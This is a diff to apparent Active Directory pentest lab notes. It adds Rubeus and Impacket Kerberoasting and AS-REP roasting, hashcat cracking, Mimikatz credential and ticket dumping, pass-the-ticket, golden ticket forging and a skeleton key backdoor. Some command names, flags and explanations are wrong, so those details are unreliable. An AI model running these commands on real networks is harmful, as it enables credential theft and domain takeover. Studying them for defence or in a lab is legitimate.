@@ -131,6 +131,8 @@ Exploitation
 ============
 -> In this phase, we will using various methods and tools for attacking an Active Directory. 
 
+i. Rubeus
+---------
 - Harvesting and Brute-forcing Tickets with Rubeus : Rubeus is a powerful tool for attacking kerberos. Rubeus has a wide variety of attacks
 and features that allow it to be very versatile tool for attacking kerberos. Just some of the many tools and attacks includes overpass
 the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting and Kerberoasting
@@ -155,19 +157,76 @@ Copy the hash file and crack it using hashcat
 $ hashcat -m 13100 -a 0 hash.txt Pass.txt
 
 - Kerberoasting with Impacket: 
-$ 
+$ cd /usr/share/doc/python3-impacket/examples/
+$ sudo python3 GetUsersSPNs.py controller.local/Machine1:Password1 -dc -ip <machine ip> -request
+$ hashcat -m 13100 -a 0 hash.txt pass.txt
 
 - AS-REP Roasting with Rubeus: Very similar to kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have
 Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP 
-roast a user must have pre-authentication disabled.
+roast a user must have pre-authentication disabled. During pre-authentication, the users hash will be used to encrypt a timestamp that
+the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After 
+validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data
+for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user
+is really who they say that they are:
+shell> Rubeus.exe asreproast
+This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
+Cracking hashes
+$ hashcat -m 18200 hash.txt pass.txt
 
+ii. Mimikatz
+-------------
+- Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping the user credentials inside of an active directory network.
 
+- Dump hashes with mimikatz
+shell> mimikatz.exe
+mz> privilege::debug
+This ensures user is an administrator
+mz> lsadump::lsa /patch
+Dump the hashes
+$hashcat -m 1000 <hash> rockyou.txt
+  Crack those hashes
+  
+- Pass the ticket 
+Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service(LSASS)
+is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the 
+gatekeeper and accept or reject the credentials provided. We can dump the Kerberos Tickets from the LSASS memory just like we dump the hashes.
+It is very beneficial in lateral movement or privilege escalation attacks.
 
+mz> privilege::debug
+mz> sekurlsa::tickets /export
+To export all .kirbi tickets into current working directory
 
+mz>kerberos:ptt <ticket>
+shell> klist
+  To verify whether we successfully impersonated the ticket by listing our cached tickets
+  
+- Golden/Silver ticket attacks
+In order to fully understand how these attacks work you need to understand the difference between KRBTGT and a TGT. A KRBTGT is the service
+account for the KDC this is the KDC that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket 
+form the KRBTGT you give yourself ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the
+KDC and can only access that service the TGT is from like the SQLService ticket.
 
+mz> privilege::debug
+mz>lsadump::lsa /inject /name:krbtgt
+This dumps the hash and security identifier of the Kerberos Ticket granting ticket account allowing you to create a golden ticket 
+Take a note of sid and NTLM hash
 
+mz> kerberos::golden /user:administrator /domain:controller.local /sid:<above sid> krbtgt:<NTLM obtained from above> /id:500
+mz> misc::cmd
 
+- Kerberos Backdoors w/ mimikatz:
+Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of domain forest
+allowing itself access to any of the machines with a master password.
+The skeleton key works by abusing the AS-REQ encrypted timestamps. The dc then tries to decrypt this timestamp with the users NT hash, once a 
+skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT
+hash allowing you access to the domain forest
+mz> misc::skeleton
+It will install the skeleton
 
+Accessing the forest
+the default credentials will be mimikatz
+shell> net use C:\\DOMAIN-CONTROLLER\admin$ /user:administrator mimikatz
+shell> dir \\Desktop-1\c$ /user:Machine1 mimikatz
 
 
 
